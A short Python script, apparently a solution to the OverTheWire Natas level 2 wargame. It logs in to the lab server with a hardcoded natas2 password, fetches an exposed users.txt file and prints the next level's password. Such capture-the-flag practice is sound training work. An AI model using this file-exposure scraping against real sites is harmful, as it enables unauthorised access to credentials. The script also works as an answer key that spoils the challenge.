#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re

#Declaring the Authentication
username = 'natas2'
password = 'h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7'
url = 'http://%s.natas.labs.overthewire.org/' %username

#Functions
response = requests.get(url + "files/users.txt", auth = (username, password))
content = response.text

#Printing the Source Code
#print(content)

#Printing only the Password
print(re.findall('natas3:(.*)', content)[0])